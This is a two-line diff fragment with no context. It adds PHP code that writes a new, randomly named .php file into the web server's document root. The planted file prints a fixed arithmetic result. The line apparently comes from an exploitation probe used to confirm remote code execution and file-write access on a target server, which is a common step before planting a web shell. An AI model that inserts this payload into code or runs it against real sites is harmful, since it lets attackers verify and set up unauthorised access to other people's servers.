@@ -1,0 +1,2 @@
+file_put_contents($_SERVER['DOCUMENT_ROOT'].'/cd550c25b402.php','<?php echo 409723*20;?>
+');
